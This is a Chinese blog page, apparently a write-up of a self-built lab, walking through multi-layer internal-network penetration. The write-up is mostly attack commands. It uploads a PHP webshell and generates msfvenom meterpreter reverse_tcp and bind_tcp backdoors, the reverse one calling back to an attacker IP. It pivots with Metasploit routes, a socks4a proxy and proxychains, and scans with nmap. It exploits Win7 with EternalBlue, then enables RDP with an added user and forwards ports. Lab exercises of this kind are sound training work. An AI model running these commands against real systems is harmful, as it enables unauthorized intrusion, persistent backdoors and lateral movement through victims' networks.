@@ -1,0 +1,585 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+
+
+
+
+
+<head>
+  <meta charset="UTF-8">
+  <link rel="apple-touch-icon" sizes="76x76" href="/img/favicons.png">
+  <link rel="icon" type="image/png" href="/img/favicons.png">
+  <meta name="viewport"
+        content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no, shrink-to-fit=no">
+  <meta http-equiv="x-ua-compatible" content="ie=edge">
+  
+  <meta name="theme-color" content="black">
+  <meta name="description" content="">
+  <meta name="author" content="zy">
+  <meta name="keywords" content="">
+  <title>一个实验了解多层内网渗透 - copyking</title>
+
+  <link  rel="stylesheet" href="https://cdn.staticfile.org/twitter-bootstrap/4.4.1/css/bootstrap.min.css" />
+
+
+  <link  rel="stylesheet" href="https://cdn.staticfile.org/github-markdown-css/4.0.0/github-markdown.min.css" />
+  <link  rel="stylesheet" href="/lib/hint/hint.min.css" />
+
+  
+    
+    <link  rel="stylesheet" href="https://cdn.staticfile.org/highlight.js/10.0.0/styles/github-gist.min.css" />
+  
+
+  
+
+
+<!-- 主题依赖的图标库，不要自行修改 -->
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1749284_yg9cfy8wd6.css">
+
+
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1736178_pjno9b9zyxs.css">
+
+
+<link  rel="stylesheet" href="/css/main.css" />
+
+<!-- 自定义样式保持在最底部 -->
+
+
+  <script  src="/js/utils.js" ></script>
+<meta name="generator" content="Hexo 4.2.1"></head>
+
+
+<body>
+  <header style="height: 30vh;">
+    <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
+  <div class="container">
+    <a class="navbar-brand"
+       href="/">&nbsp;<strong>COPYKING</strong>&nbsp;</a>
+
+    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
+            data-target="#navbarSupportedContent"
+            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
+      <div class="animated-icon"><span></span><span></span><span></span></div>
+    </button>
+
+    <!-- Collapsible content -->
+    <div class="collapse navbar-collapse" id="navbarSupportedContent">
+      <ul class="navbar-nav ml-auto text-center">
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/">
+                <i class="iconfont icon-home-fill"></i>
+                首页
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/categories/">
+                <i class="iconfont icon-category-fill"></i>
+                分类
+              </a>
+            </li>
+          
+        
+        
+          <li class="nav-item" id="search-btn">
+            <a class="nav-link" data-toggle="modal" data-target="#modalSearch">&nbsp;&nbsp;<i
+                class="iconfont icon-search"></i>&nbsp;&nbsp;</a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+</nav>
+
+    <div class="banner intro-2" id="background" parallax=true
+         style="background: url('/img/header.png') no-repeat center center;
+           background-size: cover;">
+      <div class="full-bg-img">
+        <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
+          <div class="container text-center white-text fade-in-up">
+            <span class="h2" id="subtitle">
+              
+            </span>
+
+            
+              
+  <div class="mt-3 post-meta">
+    <i class="iconfont icon-date-fill" aria-hidden="true"></i>
+    <time datetime="2020-07-31 16:36">
+      2020年7月31日 下午
+    </time>
+  </div>
+
+
+<div class="mt-1">
+  
+
+  
+
+  
+  
+</div>
+
+            
+          </div>
+
+          
+        </div>
+      </div>
+    </div>
+  </header>
+
+  <main>
+    
+      
+
+<div class="container-fluid">
+  <div class="row">
+    <div class="d-none d-lg-block col-lg-2"></div>
+    <div class="col-lg-8 nopadding-md">
+      <div class="container nopadding-md" id="board-ctn">
+        <div class="py-5" id="board">
+          <div class="post-content mx-auto" id="post">
+            
+            <article class="markdown-body">
+              <h2 id="了解内网渗透基本操作"><a href="#了解内网渗透基本操作" class="headerlink" title="了解内网渗透基本操作"></a>了解内网渗透基本操作</h2><a id="more"></a>
+<h1 id="一个实验了解多层内网渗透"><a href="#一个实验了解多层内网渗透" class="headerlink" title="一个实验了解多层内网渗透"></a>一个实验了解多层内网渗透</h1><h2 id="实验简介"><a href="#实验简介" class="headerlink" title="实验简介"></a>实验简介</h2><p>网络拓扑图：</p>
+<p><img src="/image/nwsy/wps1.png" srcset="/img/loading.gif" alt=""> </p>
+<p>渗透机：win10+kali</p>
+<p>第一层靶机 (外网web服务器):  Linux</p>
+<p>第二场靶机 (内网web服务器):  Linux</p>
+<p>第三层靶机 (内网办公机) :    win7</p>
+<p>用三层网络来模拟内外网环境,主要了解MSF、内网转发等</p>
+<h2 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h2><p>第一层网络</p>
+<p>把渗透机kali和win10网卡1设置选择VMnet1：<br><img src="/image/nwsy/wps2.png" srcset="/img/loading.gif" alt=""> </p>
+<p>靶机Linux网卡1设置选择VMnet1，添加网卡2 设置选择VMnet2：<br><img src="/image/nwsy/wps3.png" srcset="/img/loading.gif" alt=""> </p>
+<p>第二层网络</p>
+<p>将第二台靶机linux网卡1设置选择VMnet2，添加网卡2 设置选择VMnet3：<br><img src="/image/nwsy/wps4.png" srcset="/img/loading.gif" alt=""> </p>
+<p>第三层网络</p>
+<p>将靶机win7网卡1设置选择VMnet3：<br><img src="/image/nwsy/wps5.png" srcset="/img/loading.gif" alt=""> </p>
+<p>再配置好各台机器对应IP即可</p>
+<p>在第一台linux和第二台linux上搭建一个php上传页面，设为存在文件上传漏洞的web页面，以便后续的拿shell进行内网渗透</p>
+<p>第一台linux<br><img src="/image/nwsy/wps6.png" srcset="/img/loading.gif" alt=""> </p>
+<p>第二台linux<br><img src="/image/nwsy/wps7.png" srcset="/img/loading.gif" alt=""> </p>
+<h2 id="实验过程"><a href="#实验过程" class="headerlink" title="实验过程"></a>实验过程</h2><h3 id="第一层靶机"><a href="#第一层靶机" class="headerlink" title="第一层靶机"></a>第一层靶机</h3><p>Win10访问<a href="http://192.168.85.131/" target="_blank" rel="noopener">http://192.168.85.131/</a>  直接上传一句话木马</p>
+<p><img src="/image/nwsy/wps8.png" srcset="/img/loading.gif" alt=""> </p>
+<p><img src="/image/nwsy/wps9.png" srcset="/img/loading.gif" alt=""> </p>
+<p>蚁剑连接</p>
+<p><img src="/image/nwsy/wps10.png" srcset="/img/loading.gif" alt=""> </p>
+<p><img src="/image/nwsy/wps11.png" srcset="/img/loading.gif" alt=""> </p>
+<p><strong>进一步做内网渗透，上传msf后门</strong></p>
+<p>打开kali msfconsole 输入</p>
+<p><code>msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=192.168.85.128 LPORT=4444 -f elf &gt; mshell.elf</code></p>
+<p>生成一个名为mshell.elf的msf后门文件</p>
+<p><img src="/image/nwsy/wps12.png" srcset="/img/loading.gif" alt=""> </p>
+<p>蚁剑把后门文件上传到linux靶机</p>
+<p><img src="/image/nwsy/wps13.jpg" srcset="/img/loading.gif" alt=""> </p>
+<p>返回msf 开启监听</p>
+<p><code>use exploit/multi/handler</code>         //    使用监听模块</p>
+<p><code>set payload linux/x64/meterpreter/reverse_tcp</code>  // 使用和木马相同的payload</p>
+<p><code>set lhost 192.168.85.128</code>         //kaili 的ip</p>
+<p><code>set lport 4444</code>              // 木马的端口</p>
+<p><code>run</code>            // 执行</p>
+<p><img src="/image/nwsy/wps14.png" srcset="/img/loading.gif" alt=""> </p>
+<p>蚁剑打开虚拟终端cd到后门文件的目录下,执行后门文件，输入</p>
+<p><code>chmod 777 mshell.elf</code>  加执行权限</p>
+<p><code>./mshell.elf</code>  执行文件</p>
+<p><img src="/image/nwsy/wps15.png" srcset="/img/loading.gif" alt=""> </p>
+<p>Kail接受到MSF会话</p>
+<p><img src="/image/nwsy/wps16.png" srcset="/img/loading.gif" alt=""> </p>
+<p>输入<code>ifconfig</code>，发现第二层172.10.10.0/24网段</p>
+<p><img src="/image/nwsy/wps17.png" srcset="/img/loading.gif" alt=""> </p>
+<p><strong>添加路由</strong></p>
+<p><code>background</code>   //将会话转到后台</p>
+<p><code>route add 172.10.10.0/24 1</code>    //添加 172.10.10.0/24网段 使用session1</p>
+<p><code>route print</code>    // 查看路由表</p>
+<p><img src="/image/nwsy/wps18.png" srcset="/img/loading.gif" alt=""> </p>
+<p><strong>使用MSF建立socks代理</strong></p>
+<p><code>use auxiliary/server/socks4a</code></p>
+<p><code>set srvhost 192.168.85.128</code></p>
+<p><code>set srvport 10080</code></p>
+<p><code>run</code></p>
+<p><img src="/image/nwsy/wps19.png" srcset="/img/loading.gif" alt=""> </p>
+<p><strong>配置socks4代理的相关客户端Proxychains</strong></p>
+<p><strong>在配置文件/etc/proxychains.conf中添加 ：socks4 192.168.85.128 10080</strong></p>
+<p><code>vi /etc/proxychains.conf</code></p>
+<p><img src="/image/nwsy/wps20.png" srcset="/img/loading.gif" alt=""> </p>
+<p><code>添加 socks4 192.168.85.128 10080</code></p>
+<p><img src="/image/nwsy/wps21.png" srcset="/img/loading.gif" alt=""> </p>
+<p><strong>这样利用proxychains启动的应用都可以带sock4代理</strong></p>
+<p><strong>建立好代理后渗透机可以通过这台linux当跳板机进入第二层网络</strong></p>
+<h3 id="第二层靶机"><a href="#第二层靶机" class="headerlink" title="第二层靶机"></a>第二层靶机</h3><p><strong>nmap探测存在web服务的主机</strong></p>
+<p>用proxychans 启动nmap对第二层网段进行80端口扫描，执行</p>
+<p><code>proxychains nmap -sT -Pn -p 80 172.10.10.0/24</code></p>
+<p><img src="/image/nwsy/wps22.png" srcset="/img/loading.gif" alt=""> </p>
+<p>扫描发现55和56存在web服务，172.10.10.56 即为第二层网络的ip</p>
+<p><img src="/image/nwsy/wps23.png" srcset="/img/loading.gif" alt=""> </p>
+<p><strong>由于proxychains无法代理icmp的数据包 所以必须添加-sT -Pn参数,即不检测主机是否存活,直接进行端口tcp扫描</strong></p>
+<p><strong>脚本探测存活主机</strong></p>
+<p>在本地创建一个名为ping.sh的脚本</p>
+<p>脚本内容：</p>
+<p><code>#!/bin/bash</code></p>
+<p><code>ip="172.10.10."</code></p>
+<p><code>echo "ping log:" &gt; ./ping.txt</code></p>
+<p><code>for i in {1..254}</code></p>
+<p><code>do</code></p>
+<p>​    <code>ping -c 1 -w 1 -W 1 $ip$i | grep -q "ttl=" &amp;&amp; echo "$ip$i [yes]" &gt;&gt; ./ping.txt || echo "$ip$i [no]" &gt;&gt; ./ping.txt &amp;</code></p>
+<p><code>done</code></p>
+<p><code>echo "wait 5s...."</code></p>
+<p><code>sleep 5</code></p>
+<p><code>cat ./ping.txt</code></p>
+<p><code>cat ./ping.txt | wc -l</code></p>
+<p><img src="/image/nwsy/wps24.png" srcset="/img/loading.gif" alt=""> </p>
+<p>Kali进入session 1会话，然后upload命令上传刚刚创建的脚本到靶机</p>
+<p><code>upload /root/ping.sh /var/www/hrml/upload</code></p>
+<p><img src="/image/nwsy/wps25.png" srcset="/img/loading.gif" alt=""> </p>
+<p>进入shell执行</p>
+<p><code>python -c 'import pty;pty.spawn("/bin/bash")'</code> </p>
+<p>创建一个交互式shell，后</p>
+<p><code>Chmod 777 ping.sh</code></p>
+<p><code>./ping.sh</code></p>
+<p>可以看到172.10.10.0/24 网段存活56.57两台</p>
+<p><img src="/image/nwsy/wps26.png" srcset="/img/loading.gif" alt=""> </p>
+<p><strong>知道存活主机ip后就可以继续进入第二层内网主机</strong></p>
+<p>渗透机浏览器配置sock4a代理</p>
+<p><img src="/image/nwsy/wps27.jpg" srcset="/img/loading.gif" alt=""> </p>
+<p>通过代理可以访问第二层linux靶机<a href="http://172.10.10.56" target="_blank" rel="noopener">http://172.10.10.56</a> 同样上传一句话php1.php</p>
+<p><img src="/image/nwsy/wps28.png" srcset="/img/loading.gif" alt=""> </p>
+<p>蚁剑加代理连接</p>
+<p><img src="/image/nwsy/wps29.png" srcset="/img/loading.gif" alt=""> </p>
+<p>连接 <a href="http://172.10.10.56/upload/php1.php" target="_blank" rel="noopener">http://172.10.10.56/upload/php1.php</a></p>
+<p><img src="/image/nwsy/wps30.png" srcset="/img/loading.gif" alt=""> </p>
+<p><strong>进一步做内网渗透，继续上传msf后门</strong></p>
+<p>制作MSF后门</p>
+<p>返回kali msf 输入</p>
+<p><code>msfvenom -p linux/x64/meterpreter/bind_tcp LPORT=4455 -f elf &gt; mshell1.elf</code></p>
+<p>生成 mshell1.elf 后门文件</p>
+<p><img src="/image/nwsy/wps31.png" srcset="/img/loading.gif" alt=""> </p>
+<p><strong>因为在内网跨网段时无法反向代理连接到渗透的机器，所以这里使用linux/x64/meterpreter/bind_tcp这个payload进行正向代理连接</strong></p>
+<p>蚁剑上传后门</p>
+<p><img src="/image/nwsy/wps32.png" srcset="/img/loading.gif" alt=""> </p>
+<p>Kali开启监听</p>
+<p><img src="/image/nwsy/wps33.png" srcset="/img/loading.gif" alt=""> </p>
+<p>蚁剑打开虚拟终端执行后门文件</p>
+<p><img src="/image/nwsy/wps34.png" srcset="/img/loading.gif" alt=""> </p>
+<p>返回会话</p>
+<p><img src="/image/nwsy/wps35.png" srcset="/img/loading.gif" alt=""> </p>
+<p>输入ifconfig 发现第三层网络的网段10.10.10.0/24</p>
+<p><img src="/image/nwsy/wps36.png" srcset="/img/loading.gif" alt=""> </p>
+<h3 id="第三层靶机"><a href="#第三层靶机" class="headerlink" title="第三层靶机"></a>第三层靶机</h3><p><strong>添加路由</strong></p>
+<p><code>background</code> </p>
+<p><code>route add 10.10.10.0/24 2</code></p>
+<p><code>route print</code> </p>
+<p><img src="/image/nwsy/wps37.png" srcset="/img/loading.gif" alt=""> </p>
+<p>进入session 2 上传 脚本 探测存活主机</p>
+<p>注意把脚本的ip段修改成该网段再上传</p>
+<p><img src="/image/nwsy/wps38.png" srcset="/img/loading.gif" alt=""> </p>
+<p>探测到第三层网段的存活ip ：10.10.10.101</p>
+<p><img src="/image/nwsy/wps39.png" srcset="/img/loading.gif" alt=""> </p>
+<p>proxychans 启动nmap对10.10.10.101的1-500端口扫描，执行</p>
+<p><code>proxychains nmap -sT -Pn -p 1-500 10.10.10.101</code></p>
+<p><img src="/image/nwsy/wps40.png" srcset="/img/loading.gif" alt=""> </p>
+<p>发现445端口开启</p>
+<p><img src="/image/nwsy/wps41.png" srcset="/img/loading.gif" alt=""> </p>
+<p><strong>尝试使用ms17-010</strong></p>
+<p><code>use windows/smb/ms17_010_eternalblue</code></p>
+<p><code>set rhost 10.10.10.101</code></p>
+<p><code>set payload windows/x64/meterpreter/bind_tcp</code></p>
+<p><code>set lport 4466</code></p>
+<p><img src="/image/nwsy/wps42.png" srcset="/img/loading.gif" alt=""> </p>
+<p>Run ，存在445漏洞</p>
+<p><img src="/image/nwsy/wps43.png" srcset="/img/loading.gif" alt=""> </p>
+<p>执行成功，返回会话</p>
+<p><img src="/image/nwsy/wps44.png" srcset="/img/loading.gif" alt=""> </p>
+<p>开启3389远程桌面</p>
+<p><code>run post/windows/manage/enable_rdp</code> //开启远程桌面</p>
+<p><code>run post/windows/manage/enable_rdp USERNAME=zzy PASSWORD=123qwe!@#</code> //添加远程用户</p>
+<p><img src="/image/nwsy/wps45.png" srcset="/img/loading.gif" alt=""> </p>
+<p>将3389端口转回kali本地5555端口</p>
+<p><code>portfwd add -l 5555 -p 3389 -r 10.10.10.101</code></p>
+<p><img src="/image/nwsy/wps46.png" srcset="/img/loading.gif" alt=""> </p>
+<p>Win10远程桌面连接</p>
+<p><img src="/image/nwsy/wps47.png" srcset="/img/loading.gif" alt=""> </p>
+<p>登陆成功</p>
+<p><img src="/image/nwsy/wps48.png" srcset="/img/loading.gif" alt=""> </p>
+<p><strong>结束</strong></p>
+<script>
+        document.querySelectorAll('.github-emoji')
+          .forEach(el => {
+            if (!el.dataset.src) { return; }
+            const img = document.createElement('img');
+            img.style = 'display:none !important;';
+            img.src = el.dataset.src;
+            img.addEventListener('error', () => {
+              img.remove();
+              el.style.color = 'inherit';
+              el.style.backgroundImage = 'none';
+              el.style.background = 'none';
+            });
+            img.addEventListener('load', () => {
+              img.remove();
+            });
+            document.body.appendChild(img);
+          });
+      </script>
+            </article>
+            <hr>
+            <div>
+              <div class="post-metas mb-3">
+                
+                  <div class="post-meta mr-3">
+                    <i class="iconfont icon-category"></i>
+                    
+                      <a class="hover-with-bg" href="/categories/%E5%86%85%E7%BD%91/">内网</a>
+                    
+                  </div>
+                
+                
+              </div>
+              
+              
+                <div class="post-prevnext row">
+                  <div class="post-prev col-6">
+                    
+                    
+                      <a href="/2020/07/31/%E5%86%85%E7%BD%91%E6%8E%A2%E6%B5%8B%E5%AD%98%E6%B4%BB%E4%B8%BB%E6%9C%BA/">
+                        <i class="iconfont icon-arrowleft"></i>
+                        <span class="hidden-mobile">内网探测存活主机</span>
+                        <span class="visible-mobile">上一篇</span>
+                      </a>
+                    
+                  </div>
+                  <div class="post-next col-6">
+                    
+                    
+                      <a href="/2020/07/29/phpstudy%20%E5%90%8E%E9%97%A8%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/">
+                        <span class="hidden-mobile">phpstudy 后门漏洞复现</span>
+                        <span class="visible-mobile">下一篇</span>
+                        <i class="iconfont icon-arrowright"></i>
+                      </a>
+                    
+                  </div>
+                </div>
+              
+            </div>
+
+            
+          </div>
+        </div>
+      </div>
+    </div>
+    
+      <div class="d-none d-lg-block col-lg-2 toc-container" id="toc-ctn">
+        <div id="toc">
+  <p class="toc-header"><i class="iconfont icon-list"></i>&nbsp;目录</p>
+  <div id="tocbot"></div>
+</div>
+
+      </div>
+    
+  </div>
+</div>
+
+<!-- Custom -->
+
+
+    
+  </main>
+
+  
+    <a id="scroll-top-button" href="#" role="button">
+      <i class="iconfont icon-arrowup" aria-hidden="true"></i>
+    </a>
+  
+
+  
+    <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
+     aria-hidden="true">
+  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
+    <div class="modal-content">
+      <div class="modal-header text-center">
+        <h4 class="modal-title w-100 font-weight-bold">搜索</h4>
+        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
+          <span aria-hidden="true">&times;</span>
+        </button>
+      </div>
+      <div class="modal-body mx-3">
+        <div class="md-form mb-5">
+          <input type="text" id="local-search-input" class="form-control validate">
+          <label data-error="x" data-success="v"
+                 for="local-search-input">关键词</label>
+        </div>
+        <div class="list-group" id="local-search-result"></div>
+      </div>
+    </div>
+  </div>
+</div>
+  
+
+  
+
+  
+
+  <footer class="mt-5">
+  <div class="text-center py-3">
+    <div>
+      <a href="https://hexo.io" target="_blank" rel="nofollow noopener"><span>Hexo</span></a>
+      <i class="iconfont icon-love"></i>
+      <!-- <a href="https://github.com/fluid-dev/hexo-theme-fluid" target="_blank" rel="nofollow noopener">
+        <span>Fluid</span></a> -->
+    </div>
+    
+
+    
+
+    
+  </div>
+</footer>
+
+<!-- SCRIPTS -->
+<script  src="https://cdn.staticfile.org/jquery/3.4.1/jquery.min.js" ></script>
+<script  src="https://cdn.staticfile.org/twitter-bootstrap/4.4.1/js/bootstrap.min.js" ></script>
+<script  src="/js/debouncer.js" ></script>
+<script  src="/js/main.js" ></script>
+
+<!-- Plugins -->
+
+
+  
+    <script  src="/js/lazyload.js" ></script>
+  
+
+
+
+  <script defer src="https://cdn.staticfile.org/clipboard.js/2.0.6/clipboard.min.js" ></script>
+  <script  src="/js/clipboard-use.js" ></script>
+
+
+
+
+
+
+
+  <script  src="https://cdn.staticfile.org/tocbot/4.11.1/tocbot.min.js" ></script>
+  <script>
+    $(document).ready(function () {
+      var boardCtn = $('#board-ctn');
+      var boardTop = boardCtn.offset().top;
+
+      tocbot.init({
+        tocSelector: '#tocbot',
+        contentSelector: 'article.markdown-body',
+        headingSelector: 'h1,h2,h3,h4,h5,h6',
+        linkClass: 'tocbot-link',
+        activeLinkClass: 'tocbot-active-link',
+        listClass: 'tocbot-list',
+        isCollapsedClass: 'tocbot-is-collapsed',
+        collapsibleClass: 'tocbot-is-collapsible',
+        collapseDepth: 0,
+        scrollSmooth: true,
+        headingsOffset: -boardTop
+      });
+      if ($('.toc-list-item').length > 0) {
+        $('#toc').css('visibility', 'visible');
+      }
+    });
+  </script>
+
+
+
+  <script  src="https://cdn.staticfile.org/typed.js/2.0.11/typed.min.js" ></script>
+  <script>
+    var typed = new Typed('#subtitle', {
+      strings: [
+        '  ',
+        "一个实验了解多层内网渗透&nbsp;",
+      ],
+      cursorChar: "_",
+      typeSpeed: 70,
+      loop: false,
+    });
+    typed.stop();
+    $(document).ready(function () {
+      $(".typed-cursor").addClass("h2");
+      typed.start();
+    });
+  </script>
+
+
+
+  <script  src="https://cdn.staticfile.org/anchor-js/4.2.2/anchor.min.js" ></script>
+  <script>
+    anchors.options = {
+      placement: "right",
+      visible: "hover",
+      
+    };
+    var el = "h1,h2,h3,h4,h5,h6".split(",");
+    var res = [];
+    for (item of el) {
+      res.push(".markdown-body > " + item)
+    }
+    anchors.add(res.join(", "))
+  </script>
+
+
+
+  <script  src="/js/local-search.js" ></script>
+  <script>
+    var path = "/local-search.xml";
+    var inputArea = document.querySelector("#local-search-input");
+    inputArea.onclick = function () {
+      searchFunc(path, 'local-search-input', 'local-search-result');
+      this.onclick = null
+    }
+  </script>
+
+
+
+  <script  src="https://cdn.staticfile.org/fancybox/3.5.7/jquery.fancybox.min.js" ></script>
+  <link  rel="stylesheet" href="https://cdn.staticfile.org/fancybox/3.5.7/jquery.fancybox.min.css" />
+
+  <script>
+    $('#post img:not(.no-zoom img, img[no-zoom]), img[zoom]').each(
+      function () {
+        var element = document.createElement('a');
+        $(element).attr('data-fancybox', 'images');
+        $(element).attr('href', $(this).attr('src'));
+        $(this).wrap(element);
+      }
+    );
+  </script>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+</body>
+</html>
